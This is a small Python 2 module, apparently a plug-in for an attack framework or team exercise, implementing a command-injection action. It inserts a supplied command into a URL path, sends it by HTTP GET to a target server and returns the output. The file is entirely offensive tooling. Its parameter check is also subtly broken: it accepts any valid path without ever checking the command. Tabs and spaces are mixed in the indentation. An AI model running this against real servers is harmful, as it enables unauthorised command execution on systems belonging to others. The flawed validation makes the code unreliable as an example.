
#############################################################################
# "cmd_injection" action for performing command injection exploits
#############################################################################

# Standard library imports
import requests

# Local constants
PATH_KEY = "path"
COMMAND_KEY = "command"
COMMAND_TAG = "<" + COMMAND_KEY + ">"
HTTP_SUCCESS_CODE = 200
COMMENT_SUCCESS = "Command injection succeeded"
COMMENT_FAILURE = "Command injection failed"

class cmd_injection:

        # Check action parameters
	def check(self, action):

                if PATH_KEY in action:
                        if isinstance(action[PATH_KEY], str) or isinstance(action[PATH_KEY], unicode):
                                return True
                        else:
                                print("[-] cmd_injection: ERROR: Path is not a string: '{0}'".format(action[PATH_KEY]))
                else:
                        print("[-] cmd_injection: Required parameter not provided: '{0}'".format(PATH_KEY))

                if COMMAND_KEY in action:
                        if isinstance(action[COMMAND_KEY], str) or isinstance(action[COMMAND_KEY], unicode):
                                return True
                        else:
                                print("[-] cmd_injection: ERROR: Command is not a string: '{0}'".format(action[COMMAND_KEY]))
                else:
                        print("[-] cmd_injection: Required parameter not provided: '{0}'".format(COMMAND_KEY))

                return False

        # Execute action
	def action(self, teamName, address, action, data):

		path_params = action[PATH_KEY]

                # Build full URL (assume HTTP access, not HTTPS)
		url = "http://" + address + "/" + path_params
                # The command tag will be replaced by the actual command
		url = url.replace(COMMAND_TAG, action[COMMAND_KEY])

                # Access the web server
		response = requests.get(url)

                # Check response status code
		if response.status_code != HTTP_SUCCESS_CODE:
			return False, COMMENT_FAILURE, {}

		return True, COMMENT_SUCCESS, response.content
